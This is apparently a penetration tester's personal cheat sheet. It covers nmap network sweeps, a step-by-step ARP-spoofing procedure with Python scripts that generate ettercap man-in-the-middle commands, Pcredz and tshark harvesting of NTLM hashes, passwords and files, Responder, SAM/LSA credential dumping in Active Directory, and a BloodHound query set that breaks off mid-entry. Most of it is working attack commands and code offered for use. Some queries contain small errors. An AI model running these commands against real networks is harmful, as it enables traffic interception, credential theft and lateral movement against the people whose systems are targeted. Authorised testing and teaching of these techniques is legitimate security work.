# Cheat Sheet

### Disclaimer: I don't consider anything here original or of my own.
### This is a personal cheatsheet repository, just to be used as a reference or guide, or place to just hold my things.
### Googling for anything in here will probably lead you to other websites or github repo with the exact same thing.

## Key
<p># Will be used to designate major sections.</p>
<p>## Will be used to designate topics.</p>
<p>### Will be used to designate subtopics.</p>
<p>#### Will be used to designate sub-subtopics.</p>

## Credits
- Stoni
    - <a href='https://twitter.com/tehstoni'>Twitter</a>
    - Discord: stoni
    - Certifications: eJPT, PNPT, ICCA, CARTP, CNPen, CRTE
- Others waiting for permission to disclose

## Help
Triple left clicking on a code block line will highlight the entirety of it.

To the right hand side click the "Expand All" button for a tree view to be displayed.

<H1 class='tmux'> TMUX</H1>
<i>Note: '^' indicates the CTRL key.</i>
Functions follow after the command prefix.

**Default command prefix: ^b**

New pane: c
Attach existing session:
```bash
tmux a
#OR

tmux ls  #to list out sessions
tmux attach -s <session name>
```

**Common Actions**
| Description | Key | 
| -------- | -------- | 
| Split pane vertical | %     | 
| Rename session | $ |
| Rname pane | , (comma) |
| Detach session | d |
| Show panes | w |
| Select pane | 0 1 2 3 4 5 6 7 8 9 n (next) p (previous) |
| Previous pane | l (lowercase L) |
| Move selected split pane into new pane | !  |
| Move between split panes | <arrow keys> |
| Scroll Mode | PageUp [ ([ put you into copy mode) |
| Search Up page | r |
| Exit scroll or commands | q |
| Enable highlighting | <spacebar> |
| Copy highlighted text to ***TMUX*** clipboard | alt+w |
| Paste ***TMUX*** clipboard | ] |
| Check clipboard | # |

# Random Useful Tools

<H2>Hacktools</H2> 
<a href='https://github.com/LasCC/Hack-Tools'>This browser extension has ***TONS*** of functions.</a>
From reverse shell generator, to MSFVenom syntax, to shell stablilization. 

<a href='https://chrome.google.com/webstore/detail/hack-tools/cmbndhnoonmghfofefkcccljbkdpamhi'>Link for chrome</a>
<a href='https://addons.mozilla.org/en-US/firefox/addon/hacktools/'>Link for firefox</a>


# Network Enumeration and Exploitation


## Basic Enumeration with Nmap
Ping sweep to discover host on the network that respond to ICMP.
This can be a quick way to discover host.
```bash
nmap -sP -PE -v -n -T4 -iL scope.txt -oA nmap/scope-pingsweep --min-hostgroup 256 --min-rate 1280 --exclude MYIP

grep Up nmap/scope-pingsweep.gnmap | cut -d' ' -f2 > nmap/scope-pingsweep-hosts.txt
```

TCP sweep with small port list. This helps scan super large networks with many host.
That you can then narrow down to specific services to attack. 
Services:
- Web (80, 443, 8080, 8443)
- SSH (22)
- SMB (445)
- RDP (3389)
```bash
nmap -sS -p80,443,22,23,445,8080,8443,3389 -Pn -v -n -T4 -iL scope.txt -oA nmap/scope-smalltcpsweep --min-hostgroup 256 --min-rate 1280 --exclude MYIP

grep open/ nmap/scope-smalltcpsweep.gnmap | cut -d' ' -f2 > nmap/scope-smalltcpsweep-hosts.txt
```

TCP sweep with Nessus discovery port list minus the above small ports list. Useful for generating a list of host to scan.
```bash
nmap -sS -p88,139,135,515,21,6000,1025,25,111,1028,1029,79,497,548,5000,1917,53,161,49000,993,8080,2869 -Pn -v -n -T4 -iL scope.txt -oA nmap/scope-nessustcpsweep-minussmallportslist --min-hostgroup 256 --min-rate 1280 --exclude MYIP

grep open/ nmap/scope-nessustcpsweep-minussmallportslist.gnmap | cut -d' ' -f2 > nmap/scope-nessustcpsweep-minussmallportslist-hosts.txt
```

TCP sweep with Nessus discovery port list. A more comprehensive scan using specific ports on less common but still relevant ports. 
```bash
nmap -sS -p139,135,445,80,22,515,23,21,6000,1025,25,111,1028,1029,79,497,548,5000,1917,53,161,49000,443,993,8080,2869,88,2222,3389 -Pn -v -n -T4 -iL scope.txt -oA nmap/scope-nessustcpsweep --min-hostgroup 256 --min-rate 1280 --exclude MYIP

grep open/ nmap/scope-nessustcpsweep.gnmap | cut -d' ' -f2 > nmap/scope-nessustcpsweep-hosts.txt
```

UDP sweep with arbitrary ports. Fill in the PORTS text with what ever ports you want. 
```bash
nmap -sU -pPORTS -Pn -v -n -T4 -iL scope.txt -oA nmap/scope-udpsweep --min-hostgroup 256 --min-rate 1280 --reason --exclude MYIP

grep open/ nmap/scope-udpsweep.gnmap | cut -d' ' -f2 > nmap/scope-udpsweep-hosts.txt
```

Combine ping sweep and TCP sweep hosts into one hosts list.
```bash
cat nmap/scope-smalltcpsweep-hosts.txt nmap/scope-pingsweep-hosts.txt | sort -u > targets.txt
```

Find internal subnets
```bash
nmap -n -v -sP -PE 192.168.0-255.1,254 10.0-255.0-255.1,254 172.16-31.0-255.1,254 --min-hostgroup 256 --min-rate 1280 -oA nmap/internalranges-ping

grep Up nmap/internalranges-ping.gnmap  | cut -d\  -f2 | cut -d. -f1-3 | sed 's|$|.0/24|' | sort -uV > foundranges.txt

cat foundranges.txt knownranges.txt | sort -uV > ranges.txt
```



## Arp Spoofing (godmode)

Initial PCap
```bash
timeout 10m tcpdump -ni eth0 -w initial.cap 'not (port <x> and tcp)'
```
Protocol Statistics:
```bash
tshark -qz io,phs -r initial.cap
```

Nmap scan your local subnet to create a list of host to spoof.
```bash
nmap -sP -oG - -v -n SUBNET --exclude MYIP,ROUTERIPS | grep 'Status: Up' | cut -d' ' -f2 > mysubnethosts.txt
```

Use the Initial PCap to discover HSRP or VRRP, and remove router IPs any host using HSRP or VRRP from the mysubnethosts.txt file.

Set up tooling
```bash
# Pcredz
sudo Pcredz -i eth0
```

tcpdump to capture files sent over the wire
```bash
# {x} here being iteration. its good to do multiple captures to keep pcap file sizes small
tcpdump -ni eth0 -w arpspoof{x}.cap 'not port {port used to connect to box if remote}'
```

Enable traffic forwarding (plz no DoS network)
```bash
echo "1" > /proc/sys/net/ipv4/ip_forward
```

### Python scripts to generate script arp spoof script

Python2
<details>
<summary> Click me for the script</summary>

```python=
#python2

import sys

if not (len(sys.argv) == 6 or len(sys.argv) == 7):
    print 'usage: ' + sys.argv[0] + ' hostsFile outputScript gatewayIP simultaneousHosts timeoutMinutes always-attack-ips'
    sys.exit(1)

hostsFile = sys.argv[1]
outputScript = sys.argv[2]
gatewayIP = sys.argv[3]
simultaneousHosts = int(sys.argv[4])
timeout = sys.argv[5]
if len(sys.argv) == 7:
    always = sys.argv[6].split(',')
    always = [x.strip() for x in always]
    always = [x.split('.')[3] for x in always]
    simultaneousHosts -= len(always)
else:
    always = []

fInput = open(hostsFile, 'r')
hosts = fInput.readlines()
fInput.close()
hosts = [x.strip() for x in hosts]
hosts = [x for x in hosts if x != '']

subnetPrefix = '.'.join(hosts[0].split('.')[0:3]) + '.'

hosts = [x.split('.')[3] for x in hosts]
hosts = [x for x in hosts if not (x in always)]
groups = [hosts[i:i + simultaneousHosts] for i in range(0, len(hosts), simultaneousHosts)]

fOutput = open(outputScript, 'w')

for g in groups:
    fOutput.write('timeout -s 2 ' + timeout + 'm ettercap -Tq -S -M arp:remote -o -i eth0 /' + subnetPrefix + ','.join(always+g) + '// /' + gatewayIP + '//\n')

fOutput.close()
```

</details>

<br>

Python3 (WIP)
<details>
<summary> Click me for the script</summary>

```python=
#/usr/bin/python3
import sys

if not (len(sys.argv) == 6 or len(sys.argv) == 7):
    print('usage: ' + sys.argv[0] + ' hostsFile outputScript gatewayIP simultaneousHosts timeoutMinutes always-attack-ips')
    sys.exit(1)

hostsFile = sys.argv[1]
outputScript = sys.argv[2]
gatewayIP = sys.argv[3]
simultaneousHosts = int(sys.argv[4])
timeout = sys.argv[5]
if len(sys.argv) == 7:
    always = sys.argv[6].split(',')
    always = [x.strip() for x in always]
    always = [x.split('.')[3] for x in always]
    simultaneousHosts -= len(always)
else:
    always = []

with open(hostsFile, 'r') as fInput:
    hosts = fInput.readlines()
hosts = [x.strip() for x in hosts]
hosts = [x for x in hosts if x != '']

subnetPrefix = '.'.join(hosts[0].split('.')[0:3]) + '.'

hosts = [x.split('.')[3] for x in hosts]
hosts = [x for x in hosts if not (x in always)]
groups = [hosts[i:i + simultaneousHosts] for i in range(0, len(hosts), simultaneousHosts)]

with open(outputScript, 'w') as fOutput:
    for g in groups:
        fOutput.write(f'timeout -s 2 {timeout}m ettercap -Tq -S -M arp:remote -o -i eth0 /{subnetPrefix}{",".join(always+g)}// /{gatewayIP}//\n')

```

</details>

<br>

### The Process:

**Before any of this, check to see if VSRP or HRRP are running on any host on the network and be sure to exclude them from your host list.**

First you want to make sure to enable ip forwarding, so that you don't DoS the network.

Then run pcredz in its own window. This will run in the background and display all loot.
Note: You can run a `script -a pcredz.txt` to start a script before hand so that all of the loot is dumped into a script file for coming back to later.

If you want to do a packet capture to steal files transferred over the wire while you're spoofing you can do the tcpdump command.

Then use the python script followed by the fields it needs to generate the bash script, which is used to run the spoofing.

I recommend 5 host at a time over 5 or 10 minutes. Any files too big to not be captured at this rate are most likely not worth your time.

At this point everything that is needed should be in place, so go ahead and fire off the arp spoofing script in the syntax shown below.

While it is running you can copy out the NTLMv2 challenge responses, cleartext credentials, and anything else that may show up if it seems usable. 

After its done running you can use the tshark commands on the tcpdump file to extract any files that were captured in the process.


```bash
sudo echo "1" > /proc/sys/net/ipv4/ip_forward
sudo Pcredz -i eth0
tcpdump -ni eth0 -w arpspoof{x}.cap
./arpspoof.py hostsFile arp.sh gatewayIP simultaneousHosts timeoutMinutes always-attack-ips
chmod +x arp.sh
# doing it this way allows you to cancel individual spoofing sessions. doing ./arp.sh will chunk them all together
. ./arp.sh
# Watch Pcredz for NTLMv2 C/R Hashes, cleartext passwords, and other juicy bits

# After done

# Extract HTTP fields:
tshark -nr arpspoof{x}.cap -Y http.request -T fields -e http.host -e http.user_agent | sort -u
tshark -nr arpspoof{x}.cap -Y http.request -T fields -e http.host -e http.user_agent -e http.request.full_uri -e http.cookie | sort -u
# Extract SMB Files captured
mkdir smbfiles
tshark -nr arpspoof{x}.cap --export-objects smb,smbfiles
# Extract files from HTTP traffic:
mkdir httpfiles
tshark -nr arpspoof{x}.cap --export-objects http,httpfiles
# Extract files from TFTP traffic:
mkdir tftpfiles
tshark -nr arpspoof{x}.cap --export-objects tftp,tftpfiles
```

If you run into an error running pcredz regarding libcap. Run these commands.
```bash
wget http://http.us.debian.org/debian/pool/main/p/python-libpcap/python-libpcap_0.6.4-1_amd64.deb
dpkg -i python-libpcap_0.6.4-1_amd64.deb
```


## Wireless

<!--- TODO --->


# Active Directory

## Odds and Ends

Empty LM Hash
```bash
aad3b435b51404eeaad3b435b51404ee
```


## Active Directory Enumeration without Credential

When starting to attack an active directory network, the most valuable piece of information you can obtain first is a set of domain credentials. 
Followed by unauthenticated RCE and unauthenticated access to varying types of resources.

When trying to obtain credentials theres a plethora of ways to go about it depending on your scope and current level of access. So a few ways will be listed here.

### Responder (always)
This tool should always be ran and utilized on engagements. 
```bash
# just run
script -a responder.txt
sudo responder -I eth0 -wd
# ^D or 'exit' to exit the script

# set on timer
sudo timeout 30m responder -I eth0 -wd
```

### Enum4Linux

This tool has a plethora of funcitons that you can run all at once.

It will brute force RID, get description fields from ldap, and more.

```bash
enum4linux -a -d <ip>
```


## Active Directory Enumeration with Credential

Use valid credentials to generate a list of all the domain user accounts.
```bash
impacket-GetADUsers -dc-ip <dc-ip> 'domain.local/USER:PASS' -all |awk '{print $1}' > domainusers.txt
```

Use RPC to gain additional information
```bash
# List Domain Admins group members:
net rpc group members 'Domain Admins' -U 'DOMAIN/USERNAME%PASSWORD' -S IP

# Pass-the-hash:
pth-net rpc group members 'Domain Admins' -U 'DOMAIN/USERNAME%HASH' -S IP

# Enumerate users:
crackmapexec ldap -u USERNAME -p PASSWORD -d DOMAIN DCIP -M user-desc

# Enumerate users with rpcclient:
script script-rpcclient-domainusers.txt
rpcclient -U 'DOMAIN/USERNAME%PASSWORD' DCIP
enumdomusers

# Enumerate Groups for a specific user:
net rpc user info USERNAME -U 'DOMAIN/USERNAME%PASSWORD' -S IP
```

Using admin credentials to gain additional credentials or information on lateral movement
```bash
# Dump the SAM
cme smb <target/subnet> -u User -p pass --sam

# Dump LSA Secrets
cme smb <target/subnet> -u User -p pass --lsa

impacket-secretsdump.py 'DOMAIN/USER:PASS@TargetIP'

# locally dump SAM
impacket-secretsdump.py 'DOMAIN/USER:PASS@TargetIP' -sam sam.sam -security security.security -system system.system LOCAL
```
### BloodHound
#### Collectors
To utilize BloodHound (BH) you first need to have a valid set of credentials and a way to collect (LDAP) domain information.

This is done using a varying set of tools called collectors. They will query the domain for information and put them into a json format that BH can interpret and display using Neo4j. 

#### SharpHound
This collector is the standard collector. It comes as both a PowerShell script and a Compiled C# binary.
```powershell
# Powershell Script
Import-Module SharpHound.ps1
Invoke-Bloodhound -CollectionMethod All

# Binary
.\SharpHound --CollectionMethods All
```

#### Bloodhound Python
This collector is great due to being able to collect from your attacking machine.
```bash
bloodhound-python -u 'User' -p 'Pass' -d domain.local -c all -zip -dc dc01.domain.local -ns 0.0.0.0
```

#### RustHound
```bash
rusthound -d domain.local -u 'USER@domain.local' -p 'Pass' -z
```

#### SilentHound
This tool enumerates LDAP and has OPSEC/Stealth in mind
```bash
silenthound.py -u 'User' -p 'pass' <ip> domain.local -g -n -k --kerberoast
```

### BloodHound Custom Queries

#### Active Directory


**Imports**

<details>
  
<summary> Click me ffor the JSON</summary>
  
```json=
  
{
    "queries": [
        {
            "name": "Owned objects",
            "category": "Tigers love pepper",
            "queryList": [{
                "final": true,
                "query": "MATCH (m) WHERE m.owned=TRUE RETURN m"
            }]
        },
        {
            "name": "Direct groups of owned users",
            "category": "Tigers love pepper",
            "queryList": [{
                "final": true,
                "query": "MATCH (u:User {owned:true}), (g:Group), p=(u)-[:MemberOf]->(g) RETURN p",
                "props": {},
                "allowCollapse": true
            }]
        },
        {
            "name": "Unrolled groups of owned users",
            "category": "Tigers love pepper",
            "queryList": [{
                "final": true,
                "query": "MATCH (m:User) WHERE m.owned=TRUE WITH m MATCH p=(m)-[:MemberOf*1..]->(n:Group) RETURN p"
            }]
        },
        {
            "name": "Shortest paths from owned objects to High Value Targets (5 hops)",
            "category": "Tigers love pepper",
            "queryList": [{
                "final": true,
                "query": "MATCH p=shortestPath((n {owned:true})-[:MemberOf|HasSession|AdminTo|AllExtendedRights|AddMember|ForceChangePassword|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|CanRDP|ExecuteDCOM|AllowedToDelegate|ReadLAPSPassword|Contains|GpLink|AddAllowedToAct|AllowedToAct|SQLAdmin|ReadGMSAPassword|HasSIDHistory|CanPSRemote*1..5]->(m {highvalue:true})) WHERE NOT n=m RETURN p",
                "allowCollapse": true
            }]
        },
        {
            "name": "Most exploitable paths from owned objects to High Value Targets (5 hops)",
            "category": "Tigers love pepper",
            "queryList": [{
                "final": true,
                "query": "MATCH p=allShortestPaths((n {owned:true})-[:MemberOf|AdminTo|AllExtendedRights|AddMember|ForceChangePassword|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|ExecuteDCOM|AllowedToDelegate|ReadLAPSPassword|Contains|GpLink|AddAllowedToAct|AllowedToAct|SQLAdmin|ReadGMSAPassword|HasSIDHistory*1..5]->(m {highvalue:true})) WHERE NOT n=m RETURN p",
                "allowCollapse": true
            }]
        },
        {
            "name": "Next steps (5 hops) from owned objects",
            "category": "Tigers love pepper",
            "queryList": [{
                "final": true,
                "query": "MATCH p=shortestPath((c {owned: true})-[*1..5]->(s)) WHERE NOT c = s RETURN p"
            }]
        },
        {
            "name": "Next steps (3 hops) from owned objects",
            "category": "Tigers love pepper",
            "queryList": [{
                "final": true,
                "query": "MATCH p=shortestPath((c {owned: true})-[*1..3]->(s)) WHERE NOT c = s RETURN p"
            }]
        },
        {
            "name": "Connections between different domains/forests",
            "category": "Tigers love pepper",
            "queryList": [{
                "final": true,
                "query": "MATCH p = (a)-[r]->(b) WHERE NOT a.domain = b.domain RETURN p"
            }]
        },
        {
            "name": "Connections (ACEs only) between different domains/forests",
            "category": "Tigers love pepper",
            "queryList": [{
                "final": true,
                "query": "MATCH p = (a)-[r]->(b) WHERE NOT a.domain = b.domain AND r.isacl = True RETURN p"
            }]
        },
        {
            "name": "Owned users with permissions against GPOs",
            "category": "Tigers love pepper",
            "queryList": [{
                "final": true,
                "query": "MATCH p=(u:User {owned:true})-[r:AllExtendedRights|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|GpLink*1..]->(g:GPO) RETURN p"
            }]
        },
        {
            "name": "Kerberoastable users with a path to DA",
            "category": "They hate cinnamon",
            "queryList": [{
                "final": true,
                "query": "MATCH (u:User {hasspn:true}) MATCH (g:Group) WHERE g.objectid ENDS WITH '-512' MATCH p = shortestPath( (u)-[*1..]->(g) ) RETURN p"
            }]
        },
        {
            "name": "Kerberoastable users with a path to High Value",
            "category": "They hate cinnamon",
            "queryList": [{
                "final": true,
                "query": "MATCH (u:User {hasspn:true}),(n {highvalue:true}),p = shortestPath( (u)-[*1..]->(n) ) RETURN p"
            }]
        },
        {
            "name": " Kerberoastable users and where they are AdminTo",
            "category": "They hate cinnamon",
            "queryList": [{
                "final": true,
                "query": "OPTIONAL MATCH (u1:User) WHERE u1.hasspn=true OPTIONAL MATCH (u1)-[r:AdminTo]->(c:Computer) RETURN u"
            }]
        },
        {
            "name": "Kerberoastable users who are members of high value groups",
            "category": "They hate cinnamon",
            "queryList": [{
                "final": true,
                "query": "MATCH (u:User)-[r:MemberOf*1..]->(g:Group) WHERE g.highvalue=true AND u.hasspn=true RETURN u"
            }]
        },
        {
            "name": "Kerberoastable users with passwords last set > 5 years ago",
            "category": "They hate cinnamon",
            "queryList": [{
                "final": true,
                "query": "MATCH (u:User) WHERE n.hasspn=true AND WHERE u.pwdlastset < (datetime().epochseconds - (1825 * 86400)) and NOT u.pwdlastset IN [-1.0, 0.0] RETURN u"
            }]
        },
        {
            "name": "Kerberoastable Users",
            "category": "They hate cinnamon",
            "queryList": [{
                "final": true,
                "query": "MATCH (n:User)WHERE n.hasspn=true RETURN n",
                "allowCollapse": false
            }]
        },
        {
            "name": "AS-REProastable Users",
            "category": "They hate cinnamon",
            "queryList": [{
                "final": true,
                "query": "MATCH (u:User {dontreqpreauth: true}) RETURN u"
            }]
        },
        {
            "name": "Unconstrained Delegations",
            "category": "Ready to let the dogs out?",
            "queryList": [{
                "final": true,
                "query": "MATCH (c {unconstraineddelegation:true}) return c"
            }]
        },
        {
            "name": "Constrained Delegations (with Protocol Transition)",
            "category": "Ready to let the dogs out?",
            "queryList": [{
                "final": true,
                "query": "MATCH (c) WHERE NOT c.allowedtodelegate IS NULL AND c.trustedtoauth=true return c"
            }]
        },
        {
            "name": "Constrained Delegations (without Protocol Transition)",
            "category": "Ready to let the dogs out?",
            "queryList": [{
                "final": true,
                "query": "MATCH (c) WHERE NOT c.allowedtodelegate IS NULL AND c.trustedtoauth=false return c"
            }]
        },
        {
            "name": "Resource-Based Constrained Delegations",
            "category": "Ready to let the dogs out?",
            "queryList": [{
                "final": true,
                "query": "MATCH p=(u)-[:AllowedToAct]->(c) RETURN p"
            }]
        },
        {
            "name": "Unconstrained Delegation systems (without domain controllers)",
            "category": "Ready to let the dogs out?",
            "queryList": [{
                "final": true,
                "query": "MATCH (c1:Computer)-[:MemberOf*1..]->(g:Group) WHERE g.objectid ENDS WITH '-516' WITH COLLECT(c1.name) AS domainControllers MATCH (c2 {unconstraineddelegation:true}) WHERE NOT c2.name IN domainControllers RETURN c2"
            }]
        },
        {
            "name": "(Warning: edits the DB) Mark unconstrained delegation systems as high value targets",
            "category": "Ready to let the dogs out?",
            "queryList": [{
                "final": true,
                "query": "MATCH (c1:Computer)-[:MemberOf*1..]->(g:Group) WHERE g.objectid ENDS WITH '-516' WITH COLLECT(c1.name) AS domainControllers MATCH (c2 {unconstraineddelegation:true}) WHERE NOT c2.name IN domainControllers SET c2.highvalue = true RETURN c2"
            }]
        },
        {
            "name": "Shortest paths from owned principals to unconstrained delegation systems",
            "category": "Ready to let the dogs out?",
            "queryList": [{
                "final": true,
                "query": "MATCH (n {owned:true}) MATCH p=shortestPath((n)-[:MemberOf|HasSession|AdminTo|AllExtendedRights|AddMember|ForceChangePassword|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|ExecuteDCOM|AllowedToDelegate|ReadLAPSPassword|Contains|GpLink|AddAllowedToAct|AllowedToAct|SQLAdmin|ReadGMSAPassword|HasSIDHistory|CanPSRemote*1..]->(m:Computer {unconstraineddelegation: true})) WHERE NOT n=m RETURN p"
            }]
        },
        {
            "name": "Find computers admin to other computers",
            "category": "A nerdy hillbilly",
            "queryList": [{
                "final": true,
                "query": "MATCH p = (c1:Computer)-[r1:AdminTo]->(c2:Computer) RETURN p UNION ALL MATCH p = (c3:Computer)-[r2:MemberOf*1..]->(g:Group)-[r3:AdminTo]->(c4:Computer) RETURN p"
            }]
        },
        {
            "name": "Logged in Admins",
            "category": "A nerdy hillbilly",
            "queryList": [{
                "final": true,
                "query": "MATCH p=(a:Computer)-[r:HasSession]->(b:User) WITH a,b,r MATCH p=shortestPath((b)-[:AdminTo|MemberOf*1..]->(a)) RETURN p",
                "allowCollapse": true
            }]
        },
        {
            "name": "Users with local admin rights",
            "category": "A nerdy hillbilly",
            "queryList": [{
                "final": true,
                "query": "MATCH p=(m:User)-[r:AdminTo]->(n:Computer) RETURN p"
            }]
        },
        {
            "name": "Domain admin sessions",
            "category": "A nerdy hillbilly",
            "queryList": [{
                "final": true,
                "query": "MATCH (n:User)-[:MemberOf]->(g:Group) WHERE g.objectid ENDS WITH '-512' MATCH p = (c:Computer)-[:HasSession]->(n) return p"
            }]
        },
        {
            "name": "Users with adminCount, not sensitive for delegation, not members of Protected Users",
            "category": "A nerdy hillbilly",
            "queryList": [{
                "final": true,
                "query": "MATCH (u)-[:MemberOf*1..]->(g:Group) WHERE g.objectid =~ \"(?i)S-1-5-.*-525\" WITH COLLECT (u.name) as protectedUsers MATCH p=(u2:User)-[:MemberOf*1..3]->(g2:Group) WHERE u2.admincount=true AND u2.sensitive=false AND NOT u2.name IN protectedUsers RETURN p"
            }]
        },
        {
            "name": "Objects with the AddAllowedToAct or WriteAccountRestrictions right on a computer",
            "category": "A nerdy hillbilly",
            "queryList": [{
                "final": true,
                "query": "MATCH p=(g)-[:AddAllowedToAct|WriteAccountRestrictions]->(c:Computer) RETURN p"
            }]
        },
        {
            "name": "Groups that contain the word 'admin'",
            "category": "A one-man wolf pack",
            "queryList": [{
                "final": true,
                "query": "Match (n:Group) WHERE n.name CONTAINS 'ADMIN' RETURN n"
            }]
        },
        {
            "name": "Groups of High Value Targets",
            "category": "A one-man wolf pack",
            "queryList": [{
                "final": true,
                "query": "MATCH p=(n:User)-[r:MemberOf*1..]->(m:Group {highvalue:true}) RETURN p"
            }]
        },
        {
            "name": "Non Admin Groups with High Value Privileges",
            "category": "A one-man wolf pack",
            "queryList": [{
                "final": true,
                "query": "MATCH p=(g:Group)-[r:Owns|:WriteDacl|:GenericAll|:WriteOwner|:ExecuteDCOM|:GenericWrite|:AllowedToDelegate|:ForceChangePassword]->(n:Computer) WHERE NOT g.name CONTAINS 'ADMIN' RETURN p",
                "allowCollapse": true
            }]
        },
        {
            "name": "Groups with Computer and User Objects",
            "category": "A one-man wolf pack",
            "queryList": [{
                "final": true,
                "query": "MATCH (c:Computer)-[r:MemberOf*1..]->(groupsWithComps:Group) WITH groupsWithComps MATCH (u:User)-[r:MemberOf*1..]->(groupsWithComps) RETURN DISTINCT(groupsWithComps) as groupsWithCompsAndUsers",
                "allowCollapse": true,
                "endNode": "{}"
            }]
        },
        {
            "name": "Groups that can reset passwords (Warning: Heavy)",
            "category": "A one-man wolf pack",
            "queryList": [{
                "final": true,
                "query": "MATCH p=(m:Group)-[r:ForceChangePassword]->(n:User) RETURN p"
            }]
        },
        {
            "name": "Groups that have local admin rights (Warning: Heavy)",
            "category": "A one-man wolf pack",
            "queryList": [{
                "final": true,
                "query": "MATCH p=(m:Group)-[r:AdminTo]->(n:Computer) RETURN p"
            }]
        },
        {
            "name": "Users never logged on and account still active",
            "category": "There are skittles in there!",
            "queryList": [{
                "final": true,
                "query": "MATCH (n:User) WHERE n.lastlogontimestamp=-1.0 AND n.enabled=TRUE RETURN n "
            }]
        },
        {
            "name": "Users logged in the last 90 days",
            "category": "There are skittles in there!",
            "queryList": [{
                "final": true,
                "query": "MATCH (u:User) WHERE u.lastlogon < (datetime().epochseconds - (90 * 86400)) and NOT u.lastlogon IN [-1.0, 0.0] RETURN u"
            }]
        },
        {
            "name": "Users with passwords last set in the last 90 days",
            "category": "There are skittles in there!",
            "queryList": [{
                "final": true,
                "query": "MATCH (u:User) WHERE u.pwdlastset < (datetime().epochseconds - (90 * 86400)) and NOT u.pwdlastset IN [-1.0, 0.0] RETURN u"
            }]
        },
        {
            "name": "Find if unprivileged users have rights to add members into groups",
            "category": "There are skittles in there!",
            "queryList": [{
                "final": true,
                "query": "MATCH (n:User {admincount:False}) MATCH p=allShortestPaths((n)-[r:AddMember*1..]->(m:Group)) RETURN p"
            }]
        },
        {
            "name": "Find all users a part of the VPN group",
            "category": "There are skittles in there!",
            "queryList": [{
                "final": true,
                "query": "Match p=(u:User)-[:MemberOf]->(g:Group) WHERE toUPPER (g.name) CONTAINS 'VPN' return p"
            }]
        },
        {
            "name": "View all GPOs",
            "category": "There are skittles in there!",
            "queryList": [{
                "final": true,
                "query": "Match (n:GPO) RETURN n"
            }]
        },
        {
            "name": "Find if any domain user has interesting permissions against a GPO (Warning: Heavy)",
            "category": "There are skittles in there!",
            "queryList": [{
                "final": true,
                "query": "MATCH p=(u:User)-[r:AllExtendedRights|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|GpLink*1..]->(g:GPO) RETURN p"
            }]
        },
        {
            "name": "Can a user from domain ‘A ‘ do anything to any computer in domain ‘B’ (Warning: VERY Heavy)",
            "category": "There are skittles in there!",
            "queryList": [{
                    "final": false,
                    "title": "Select source domain...",
                    "query": "MATCH (n:Domain) RETURN n.name ORDER BY n.name DESC"
                },
                {
                    "final": false,
                    "title": "Select destination domain...",
                    "query": "MATCH (n:Domain) RETURN n.name ORDER BY n.name DESC"
                },
                {
                    "final": true,
                    "query": "MATCH (n:User {domain: {result}}) MATCH (m:Computer {domain: {}}) MATCH p=allShortestPaths((n)-[r:MemberOf|HasSession|AdminTo|AllExtendedRights|AddMember|ForceChangePassword|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|CanRDP|ExecuteDCOM|AllowedToDelegate|ReadLAPSPassword|Contains|GpLink|AddAllowedToAct|AllowedToAct|SQLAdmin*1..]->(m)) RETURN p",
                    "startNode": "{}",
                    "allowCollapse": false
                }
            ]
        },
        {
            "name": "Find all computers running with Windows XP",
            "category": "It’s not illegal. It’s frowned upon",
            "queryList": [{
                "final": true,
                "query": "MATCH (c:Computer) WHERE toUpper(c.operatingsystem) CONTAINS 'XP' RETURN c"
            }]
        },
        {
            "name": "Find all computers running with Windows 2000",
            "category": "It’s not illegal. It’s frowned upon",
            "queryList": [{
                "final": true,
                "query": "MATCH (c:Computer) WHERE toUpper(c.operatingsystem) CONTAINS '2000' RETURN c"
            }]
        },
        {
            "name": "Find all computers running with Windows 2003",
            "category": "It’s not illegal. It’s frowned upon",
            "queryList": [{
                "final": true,
                "query": "MATCH (c:Computer) WHERE toUpper(c.operatingsystem) CONTAINS '2003' RETURN c"
            }]
        },
        {
            "name": "Find all computers running with Windows 2008",
            "category": "It’s not illegal. It’s frowned upon",
            "queryList": [{
                "final": true,
                "query": "MATCH (c:Computer) WHERE toUpper(c.operatingsystem) CONTAINS '2008' RETURN c"
            }]
        },
        {
            "name": "Find all computers running with Windows Vista",
            "category": "It’s not illegal. It’s frowned upon",
            "queryList": [{
                "final": true,
                "query": "MATCH (c:Computer) WHERE toUpper(c.operatingsystem) CONTAINS 'VISTA' RETURN c"
            }]
        },
        {
            "name": "Find all computers running with Windows 7",
            "category": "It’s not illegal. It’s frowned upon",
            "queryList": [{
                "final": true,
                "query": "MATCH (c:Computer) WHERE toUpper(c.operatingsystem) CONTAINS '7' RETURN c"
            }]
        },
        {
            "name": "Top Ten Users with Most Sessions",
            "category": "Not at the table Carlos!",
            "queryList": [{
                "final": true,
                "query": "MATCH (n:User),(m:Computer), (n)<-[r:HasSession]-(m) WHERE NOT n.name STARTS WITH 'ANONYMOUS LOGON' AND NOT n.name='' WITH n, count(r) as rel_count order by rel_count desc LIMIT 10 MATCH p=(m)-[r:HasSession]->(n) RETURN p",
                "allowCollapse": true
            }]
        },
        {
            "name": "Top Ten Computers with Most Sessions",
            "category": "Not at the table Carlos!",
            "queryList": [{
                "final": true,
                "query": "MATCH (n:User),(m:Computer), (n)<-[r:HasSession]-(m) WHERE NOT n.name STARTS WITH 'ANONYMOUS LOGON' AND NOT n.name='' WITH m, count(r) as rel_count order by rel_count desc LIMIT 10 MATCH p=(m)-[r:HasSession]->(n) RETURN p",
                "allowCollapse": true
            }]
        },
        {
            "name": "Top Ten Users with Most Local Admin Rights",
            "category": "Not at the table Carlos!",
            "queryList": [{
                "final": true,
                "query": "MATCH (n:User),(m:Computer), (n)-[r:AdminTo]->(m) WHERE NOT n.name STARTS WITH 'ANONYMOUS LOGON' AND NOT n.name='' WITH n, count(r) as rel_count order by rel_count desc LIMIT 10 MATCH p=(m)<-[r:AdminTo]-(n) RETURN p",
                "allowCollapse": true
            }]
        },
        {
            "name": "Top Ten Computers with Most Admins and their admins",
            "category": "Not at the table Carlos!",
            "queryList": [{
                "final": true,
                "query": "MATCH (n:User),(m:Computer), (n)-[r:AdminTo]->(m) WHERE NOT n.name STARTS WITH 'ANONYMOUS LOGON' AND NOT n.name='' WITH m, count(r) as rel_count order by rel_count desc LIMIT 10 MATCH p=(m)<-[r:AdminTo]-(n) RETURN p",
                "allowCollapse": true
            }]
        },
        {
            "name": "Top Ten Computers with Most Admins",
            "category": "Not at the table Carlos!",
